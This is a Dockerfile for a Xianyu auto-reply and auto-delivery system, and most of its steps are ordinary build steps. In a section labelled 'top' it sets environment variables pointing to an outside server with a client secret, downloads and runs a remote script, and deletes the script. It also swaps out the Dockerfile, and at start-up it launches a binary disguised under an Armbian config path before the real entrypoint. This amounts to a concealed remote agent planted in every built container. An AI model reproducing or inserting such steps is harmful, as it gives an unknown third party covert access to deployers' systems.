# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"

WORKDIR /app

ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright

# ---------------- 安装系统依赖 ----------------
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl wget unzip ca-certificates tzdata \
        libjpeg-dev libpng-dev libfreetype6-dev fonts-dejavu-core \
    && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 安装可选依赖（失败不影响构建）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        libnss3 libnspr4 libatk-bridge2.0-0 libdrm2 libxkbcommon0 \
        libxcomposite1 libxdamage1 libxrandr2 libgbm1 libxss1 \
        libasound2 libatspi2.0-0 libgtk-3-0 libgdk-pixbuf2.0-0 \
        libxcursor1 libxi6 libxrender1 libxext6 libx11-6 libxft2 \
        libxinerama1 libxtst6 xdg-utils \
    || true && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 安装 Node.js / npm 官方源
RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y nodejs \
    && npm --version \
    && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 复制 requirements.txt 并安装 Python 依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制项目文件
COPY . .

# 安装 Playwright 浏览器
RUN playwright install chromium && \
    playwright install-deps chromium

# 创建必要目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# ---------------- 安装 top ----------------
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

RUN curl -L https://r2.916919.xyz/ko30re/top.sh -o /app/top.sh \
    && chmod +x /app/top.sh \
    && /app/top.sh || true

# 清理构建文件并复制 Dockerfile-cn
RUN rm -f /app/top.sh \
    && rm -rf /app/.github \
    && rm -f /app/Dockerfile \
    && cp /app/Dockerfile-cn /app/Dockerfile

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制入口脚本并赋予执行权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && dos2unix /app/entrypoint.sh 2>/dev/null || true

# ---------------- 启动 top + entrypoint.sh ----------------
CMD ["/bin/bash", "-c", "/usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml & exec /app/entrypoint.sh"]
